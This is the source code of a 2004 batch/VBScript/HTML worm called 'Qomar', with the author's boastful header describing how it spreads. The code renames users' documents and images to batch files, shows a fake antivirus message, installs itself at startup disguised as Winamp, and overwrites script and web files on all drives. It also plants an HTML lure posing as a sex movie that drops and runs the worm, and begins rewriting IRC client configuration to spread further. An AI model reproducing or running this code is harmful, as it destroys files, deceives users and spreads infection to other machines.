:: BAT.VBS.HTML ~ piRcH Qomar ___________________________________________
::    _______   _______   _       _   _______       ____   ____  _______
::   / ____ \\ / ____ \\ /\\     /\\ / ____ \\     /   \\ /  // / ____ \\
::  / //___\// \ \\_ \// \ \\   / // \ \\_ \//    /  /\ \/  // / //   \//
::  \______ \\ / __//     \ \\ / //  / __//      /  // \   //  \ \\   _
::  /\\___/ // \ \\__/\\   \ \/ //   \ \\__/\\  /  //  /  //    \ \\__/\\
::  \______//   \_____//    \__//     \_____// /__//  /__//      \_____//
:: ________________________http://trax.to/sevenC_________________________
:: ________________________sevenC_zone@yahoo.com_________________________
:: This is my latest batcH ViRuS...!! after I wrote BAT.REMIX, I think I should
:: write COMPLEX BATCH again..!! 
:: First,Bat will rename all doc,txt,gif,jpg files to baTcH
:: in  C:\ , Windir & My Document.
:: Bat Will create VBS File in C:\, named as Qomarudin.vbs
:: and it will create Qomar.VBS in %windir% and execute it,infect all batch in hd
:: Qomar.vbs will create startup viruses (Winamp32.exe.vbs) in Startup folder
:: And create 3 diferent type of virus in %windir%
:: Files in %windir% --> Qomar.vbs , Qomar.bat & Qomar.html 
:: And Qomar.vbs will search Event.ini HD if exist,then it will infect the script and
:: Qomar.html that contains Qomar.bat as attachment file to spreading 
:: I think it's very good worm.. OK.. that's all about this ShiT... :P ...  
:: Happy valentine....!!
::
:: sevenC / IVWA
:: Jan 24 2004 
:: Bekasi-Indonesia
:: ______________________________________________________________________
:: 
:: 
@ctty nul
@echo off
@copy %0 %windir%\Qomar.bat
@for %%a in (C:\windows\*.txt) do ren %%a *.bat
@for %%a in (C:\windows\*.gif) do ren %%a *.bat
@for %%a in (C:\windows\*.jpg) do ren %%a *.bat
@for %%a in (C:\Mydocu~1\*.txt) do ren %%a *.bat
@for %%a in (C:\Mydocu~1\*.doc) do ren %%a *.bat
@for %%a in (C:\*.txt) do ren %%a *.bat
@for %%a in (C:\windows\*.bmp) do ren %%a *.bat
@for %%a in (C:\Mydocu~1\*.bmp) do ren %%a *.bat
@echo off
@Echo set ff=createobject("scripting.filesystemobject")>>C:\Qomarudin.vbs
@Echo set rr=ff.opentextfile("%0",1)>>C:\Qomarudin.vbs 
@Echo lls=Split(rr.ReadAll,vbCrLf)>>C:\Qomarudin.vbs
@Echo for ii=60 to 310>>C:\Qomarudin.vbs
@Echo newcode=newcode & vbcrlf & lls(ii)>>C:\Qomarudin.vbs 
@Echo next>>C:\Qomarudin.vbs
@Echo set ww=ff.createtextfile(ff.getspecialfolder(0) & "\Qomar.vbs",true)>>C:\Qomarudin.vbs
@Echo ww.write newcode>>C:\Qomarudin.vbs
@Echo ww.close>>C:\Qomarudin.vbs
@Echo set ss=createobject("wscript.shell")>>C:\Qomarudin.vbs
@Echo ss.run ff.getspecialfolder(0) & "\wscript.exe " & ff.getspecialfolder(0) & "\Qomar.vbs %",1,false>>C:\Qomarudin.vbs
@cscript C:\Qomarudin.vbs
@del C:\Qomarudin.vbs
@cls
Echo Finished checking your PC from Virus
Echo No infected files found
Echo Copyright(c)Qomar-Antivirus
Echo Hit any key to scan your Master boot record...
@pause
goto end
'BAT.VBS.HTML~PIRCH~ QOMAR
'By sevenC/IVWA || http://trax.to/sevenC || http://sevenc.vze.com || sevenC_zone@yahoo.com
'_________________________________________________________________________________________

'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Dim sucke, Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder 
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
On error resume next
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Set sucke = wscript.CreateObject("WScript.Shell")
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Set Fso = CreateObject("scripting.FileSystemObject")
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Fso.copyfile wscript.scriptfullname, "C:\WINDOWS\Start Menu\Programs\StartUp\Winamp32.exe.vbs"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Fso.copyfile wscript.scriptfullname, "C:\windows\Qomar.vbs"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
'I think Qomar is not lamer guys...!!
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
set rm=fso.opentextfile("C:\windows\Qomar.bat")
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
llll=1
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Do While rm.atendofstream = False
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
line= rm.readline
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
if llll=1 then
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
code= replace(line, Chr(34), Chr(34) & " & chr(34) & " & Chr(34) )
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
else
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
code= code & Chr(34) & " & vbcrlf & " & Chr(34) & replace(line, Chr(34), Chr(34) & " & chr(34) & " & Chr(34) )
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
end if
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
llll=llll+1
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Loop
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
htm = "<" & "html><" & "head><" & "title>Qomarudin...sex movie</" & "title></" & "head><" & "body><" & "script langua" & "ge=vbscr" & "ipt>" & vbCrLf & "on error resume next" & vbCrLf & "set fs=createobject(""scripting.filesystemobject"")" & vbCrLf & "if err.number=429 then" & vbCrLf & "document.write " & Chr(34) & "<fo" & "nt face='verdana' size='2' color='#FF0000'>You need ActiveX enabled to see this file<br>Click <" & "a hre" & "f='javascript:location.reload()'>Here</a> to reload and click Yes</font>" & Chr(34) & "" & vbCrLf & "else" & vbCrLf & "set wb=fs.createtextfile(fs.getspecialfolder(0) & " & Chr(34) & "\qomar.bat" & Chr(34) & ",true)" & vbCrLf
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
htm = htm & "wb.write " & chr(34) & code & chr(34)
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
htm = htm & vbCrLf & "wb.close" & vbCrLf & "set ws=createobject(" & Chr(34) & "wscript.shell" & Chr(34) & ")" & vbCrLf & "ws.run fs.getspecialfolder(0) & " & Chr(34) & "\Qomar.bat" & Chr(34) & ",false " & vbCrLf & "document.write " & Chr(34) & "<" & "font face='verdana' size='2' color='#FF000" & "0'>This document has permanent errors, try downloading it again</" & "font>" & Chr(34) & "" & vbCrLf & "end if" & vbCrLf & "</" & "script></" & "body></" & "html>"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Set qomaru = Fso.createtextfile("C:\windows\qomar.html", True)
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
qomaru.write htm
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
qomaru.Close
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
'Qomar still a life
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Set Drives=fso.drives 
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
For Each Drive in Drives
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
If drive.isready then
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Dosearch drive & "\"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
end If 
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Next 
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Function Dosearch(Path) 
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Set Folder=fso.getfolder(path) 
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Set Files = folder.files
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
For Each File in files
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
If fso.GetExtensionName(file.path)="vbs" or fso.GetExtensionName(file.path)="vbe" then 
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Set ooooo = Fso.OpenTextFile("C:\windows\Qomar.vbs")
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
oooooo = ooooo.readall 
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
ooooo.close 
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Set dropper = Fso.createtextfile(file.path, True)
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
dropper.write oooooo
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
dropper.Close
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
end if
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
if fso.GetExtensionName(File.path)="htm" or fso.GetExtensionName(File.path)="html" or fso.GetExtensionName(File.path)="asp" or fso.GetExtensionName(File.path)="php" then
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
set rm=fso.opentextfile("C:\windows\Qomar.bat")
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
llll=1
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Do While rm.atendofstream = False
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
line= rm.readline
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
if llll=1 then
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
code= replace(line, Chr(34), Chr(34) & " & chr(34) & " & Chr(34) )
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
else
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
code= code & Chr(34) & " & vbcrlf & " & Chr(34) & replace(line, Chr(34), Chr(34) & " & chr(34) & " & Chr(34) )
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
end if
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
llll=llll+1
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Loop
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
htm = "<" & "html><" & "head><" & "title>Qomarudin... Sex movie</" & "title></" & "head><" & "body><" & "script langua" & "ge=vbscr" & "ipt>" & vbCrLf & "on error resume next" & vbCrLf & "set fs=createobject(""scripting.filesystemobject"")" & vbCrLf & "if err.number=429 then" & vbCrLf & "document.write " & Chr(34) & "<fo" & "nt face='verdana' size='2' color='#FF0000'>You need ActiveX enabled to see this file<br>Click <" & "a hre" & "f='javascript:location.reload()'>Here</a> to reload and click Yes</font>" & Chr(34) & "" & vbCrLf & "else" & vbCrLf & "set wb=fs.createtextfile(fs.getspecialfolder(0) & " & Chr(34) & "\Qomar.bat" & Chr(34) & ",true)" & vbCrLf
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
htm = htm & "wb.write " & chr(34) & code & chr(34)
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
htm = htm & vbCrLf & "wb.close" & vbCrLf & "set ws=createobject(" & Chr(34) & "wscript.shell" & Chr(34) & ")" & vbCrLf & "ws.run fs.getspecialfolder(0) & " & Chr(34) & "\Qomar.bat" & Chr(34) & ",false " & vbCrLf & "document.write " & Chr(34) & "<" & "font face='verdana' size='2' color='#FF000" & "0'>This document has permanent errors, try downloading it again</" & "font>" & Chr(34) & "" & vbCrLf & "end if" & vbCrLf & "</" & "script></" & "body></" & "html>"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Set dropper = Fso.createtextfile(file.path, True)
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
dropper.write htm
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
dropper.Close
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
'Qomar is very funny
end if
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
If fso.GetExtensionName(file.path)="bat" then 
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Set fso = createobject("scripting.filesystemobject") 
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Set ooooo = fso.opentextfile("C:\windows\Qomar.bat") 
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
oooooo = ooooo.readall 
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
ooooo.close 
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
Set dropper = Fso.createtextfile(file.path, True)
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
dropper.write oooooo
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
dropper.Close
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
end if
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
if file.name="Events.ini" then
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
set si=fso.createtextfile(file.path, true)
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "[Levels]"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "Enabled=1"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "Count=6"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "Level1=000-Unknowns"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "000-UnknownsEnabled=1"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "Level2=100-Level 100"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "100-Level 100Enabled=1"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "Level3=200-Level 200"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "200-Level 200Enabled=1"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine "Level4=300-Level 300"
'BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-BAT.VBS.HTML~PIRCH~ QOMAR-
si.WriteLine " 300-Level 300Enabled=1"
